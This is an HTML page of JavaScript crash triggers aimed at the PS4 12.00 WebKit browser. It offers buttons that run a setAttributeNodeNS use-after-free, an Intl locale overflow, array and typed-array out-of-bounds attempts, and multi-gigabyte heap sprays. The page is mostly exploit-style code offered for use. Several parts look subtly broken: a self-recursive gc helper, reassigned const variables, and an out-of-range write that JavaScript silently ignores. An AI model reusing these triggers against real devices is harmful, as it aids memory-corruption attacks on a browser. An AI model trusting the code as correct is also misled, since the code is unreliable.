<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 WebKit Crash Tests</title>
   
</head>
<body>
    <h1>PS4 12.00 – WebKit Crash Tests</h1>

    <button id="b1">1. UAF setAttributeNodeNS</button><br>
    <button id="b2">2. Intl.getCanonicalLocales BOF</button><br>
    <button id="b3">3. Array.concat Memcpy OOB</button><br>
    <button id="b4">4. TypedArray OOB + Spray</button><br>
    <button id="b5">5. Fullscreen + 5 GB Spray</button>

    <pre id="out"></pre>

<script type="module">
const out = document.getElementById('out');
const log = (msg,cls='')=>{ out.innerHTML+=`<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}\n</span>`; out.scrollTop=out.scrollHeight; };
const PAUSE = ms=>new Promise(r=>setTimeout(r,ms));

/* ---------- UTILIDADES ---------- */
const gc = ()=>{ for(let i=0;i<100;i++)new ArrayBuffer(0x100000); if(typeof gc!=='undefined')gc(); };

/* ---------- TESTE 1 ---------- */
document.getElementById('b1').onclick = async ()=>{
    const btn = document.getElementById('b1'); btn.disabled=true;
    log('TESTE 1: UAF setAttributeNodeNS','ok');
    try{
        window.callback = ()=>{ window.callback=null; d.setAttributeNodeNS(src); f.setAttributeNodeNS(document.createAttribute('src')); };
        const src = document.createAttribute('src'); src.value='javascript:parent.callback()';
        const d = document.createElement('div');
        const f = document.body.appendChild(document.createElement('iframe'));
        f.setAttributeNodeNS(src); f.remove(); f=null; src=null;
        gc();
        await PAUSE(500);
        alert(d.attributes[0].ownerElement);
        log('UAF NÃO disparou (patched?)','err');
    }catch(e){
        log(`UAF CRASH: ${e.message}`,'err');
    }
    btn.disabled=false;
};

/* ---------- TESTE 2 ---------- */
document.getElementById('b2').onclick = async ()=>{
    const btn = document.getElementById('b2'); btn.disabled=true;
    log('TESTE 2: Intl BOF','ok');
    try{
        Object.prototype.__defineGetter__(1000,()=>2);
        const locales = ['mr','bs','ee-TG','ms','kam-KE','mt','ha','es-HN','ml-IN','ro-MD',
                         'kab-DZ','he','es-CO','my','es-PA','az-Latn','mer','en-NZ','xog-UG','sg'];
        Intl.getCanonicalLocales(locales);
        log('Intl NÃO crashou','err');
    }catch(e){
        log(`Intl BOF: ${e.message}`,'err');
    }
    btn.disabled=false;
};

/* ---------- TESTE 3 ---------- */
document.getElementById('b3').onclick = async ()=>{
    const btn = document.getElementById('b3'); btn.disabled=true;
    log('TESTE 3: Array.concat OOB','ok');
    try{
        const len=0x10000;
        const a=new Array(len).fill(1.1);
        const b=new Array(len).fill(2.2);
        a.concat(b);
        log('concat NÃO crashou','err');
    }catch(e){
        log(`concat OOB: ${e.message}`,'err');
    }
    btn.disabled=false;
};

/* ---------- TESTE 4 ---------- */
document.getElementById('b4').onclick = async ()=>{
    const btn = document.getElementById('b4'); btn.disabled=true;
    log('TESTE 4: TypedArray OOB + Spray','ok');
    const spray=[];
    for(let i=0;i<2000;i++){
        const buf=new ArrayBuffer(0x1000);
        new Uint32Array(buf)[0]=0xDEADBEEF;
        spray.push(buf);
    }
    const victim=new Uint32Array(100);
    gc(); await PAUSE(300);
    try{
        victim[999999]=0x41414141;               // OOB write
        log('OOB write sem exceção (heap corrompido?)','err');
    }catch(e){
        log(`OOB crash: ${e.message}`,'err');
    }
    btn.disabled=false;
};

/* ---------- TESTE 5 ---------- */
document.getElementById('b5').onclick = async ()=>{
    const btn = document.getElementById('b5'); btn.disabled=true;
    log('TESTE 5: Fullscreen + 5 GB Spray','ok');
    document.body.requestFullscreen().catch(()=>0);
    const bufs=[];
    try{
        for(let i=0;i<5000;i++) bufs.push(new Uint8Array(1024*1024).fill(0x41));
        gc();
        log('5 GB alocados – aguarde crash','err');
        await PAUSE(3000);
    }catch(e){
        log(`BRUTAL crash: ${e.message}`,'err');
    }
    btn.disabled=false;
};
</script>
</body>
</html>

